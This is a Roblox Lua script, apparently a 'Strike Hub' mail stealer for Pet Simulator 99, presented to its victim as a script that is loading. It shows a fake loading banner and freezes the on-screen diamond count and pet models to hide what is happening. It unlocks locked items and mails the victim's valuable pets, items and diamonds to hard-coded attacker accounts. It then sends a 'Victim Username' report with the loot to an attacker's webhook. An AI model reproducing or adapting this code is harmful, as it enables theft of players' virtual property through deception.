_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 10000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- Find mail price function
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if type(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()
local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- Remove any existing GUI
if plr.PlayerGui:FindFirstChild("StrikeHubLoading") then
    plr.PlayerGui.StrikeHubLoading:Destroy()
end

-- Create top-screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "StrikeHubLoading"
screenGui.ResetOnSpawn = false
screenGui.Parent = plr.PlayerGui

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0, 50)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.BackgroundTransparency = 0.5
textLabel.Text = "Please wait while the script loads"
textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold
textLabel.Parent = screenGui

-- Visual freeze setup
print("Setting up visual freeze")
local RunService = game:GetService("RunService")
local petsFolder = workspace.__THINGS.Pets
local freezeConnection

freezeConnection = RunService.RenderStepped:Connect(function()
    -- Freeze currency
    pcall(function()
        plr.leaderstats["\240\159\146\142 Diamonds"].Value = GemAmount1
    end)

    -- Freeze equipped pets, skip ridden pets
    if petsFolder then
        for _, pet in ipairs(petsFolder:GetChildren()) do
            if isPetEquippedModel(pet) then
                if not pet:FindFirstChild("ridingTag") then
                    anchorModelParts(pet)
                end
            end
        end
    end
end)
print("Visual freeze active")

-- Unanchor pets and cleanup on leave
plr.AncestryChanged:Connect(function(_, parent)
    if not parent then
        if freezeConnection then pcall(function() freezeConnection:Disconnect() end) end
        if petsFolder then
            for _, pet in ipairs(petsFolder:GetChildren()) do
                if not pet:FindFirstChild("ridingTag") then
                    pcall(function() unanchorModelParts(pet) end)
                end
            end
        end
        if screenGui then pcall(function() screenGui:Destroy() end) end
    end
end)

-- Functions for RAP and sending items
local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
        AbstractGetRAP = function(self) return nil end
    }) or 0)
end

local function sendItem(category, uid, am, recipient)
    local remaining = am or 1
    local userIndex = 1
    local maxUsers = #users

    while remaining > 0 do
        local currentUser = recipient or users[userIndex]
        local args = {[1]=currentUser, [2]=MailMessage, [3]=category, [4]=uid, [5]=1}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))

        if response == true then
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.ceil(mailSendPrice * 1.5)
            if mailSendPrice > 5000000 then mailSendPrice = 5000000 end
            remaining = remaining - 1
            return currentUser -- return recipient for webhook
        elseif err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                warn("All mailboxes full for item "..uid)
                return nil
            end
        else
            warn("Failed to send item: "..tostring(err))
            return nil
        end
    end
end

-- Send remaining gems only to specified users
local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            local remainingGems = GemAmount1
            for _, currentUser in ipairs(users) do
                if remainingGems <= 0 then break end
                local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=i, [5]=remainingGems}
                local response, err = network.Invoke("Mailbox: Send", unpack(args))
                if response == true then
                    GemAmount1 = GemAmount1 - remainingGems
                    -- Track recipient for webhook
                    table.insert(sortedItems, {category="Currency", uid=i, amount=remainingGems, rap=0, name="Diamonds", recipient=currentUser})
                    remainingGems = 0
                    break
                elseif err == "They don't have enough space!" then
                    -- try next user
                else
                    warn("Failed to send gems: "..tostring(err))
                    return
                end
            end
            if remainingGems > 0 then
                warn("Not all diamonds could be sent, all specified mailboxes full")
            end
        end
    end
end

-- Webhook function
local function SendMessage()
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }

    for _, item in ipairs(sortedItems) do
        local recipient = item.recipient or "Unknown"
        fields[2].value = fields[2].value .. item.name .. " (x" .. item.amount .. ")" .. ": " 
            .. formatNumber(item.rap * item.amount) 
            .. " RAP | Recipient: " .. recipient .. "\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(GemAmount1), formatNumber(totalRAP))

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\144\177 New PS99 Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Strike Hub."}
        }}
    }

    local body = HttpService:JSONEncode(data)
    request({Url = webhook, Method = "POST", Headers = headers, Body = body})
end

-- Collect items above min_rap
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"} -- exclude Booth, Hoverboard

for _,v in pairs(categoryList) do
    if save[v] then
        for uid,item in pairs(save[v]) do
            local rapValue = getRAP(v, item)
            if v=="Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if (dir.huge or dir.exclusiveLevel or dir.Gargantuan) and rapValue >= min_rap then
                    local prefix=""
                    if item.pt==1 then prefix="Golden " elseif item.pt==2 then prefix="Rainbow " end
                    if item.sh then prefix="Shiny "..prefix end
                    local id = prefix..item.id
                    table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            else
                if rapValue >= min_rap then
                    table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=item.id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            end
            if item._lk then
                network.Invoke("Locking_SetLocked", uid, false)
            end
        end
    end
end

-- Start sending process
if #sortedItems>0 or GemAmount1>min_rap+mailSendPrice then
    table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)

    -- Send all items first
    for _,item in ipairs(sortedItems) do
        if item.rap >= min_rap and GemAmount1 > mailSendPrice then
            local recipient = sendItem(item.category, item.uid, item.amount)
            item.recipient = recipient
        end
    end

    -- Send remaining gems last to specified users
    if GemAmount1 > mailSendPrice then
        SendAllGems()
    end

    -- Send webhook
    spawn(SendMessage)

    message.Error("Please wait while the script loads!")
end
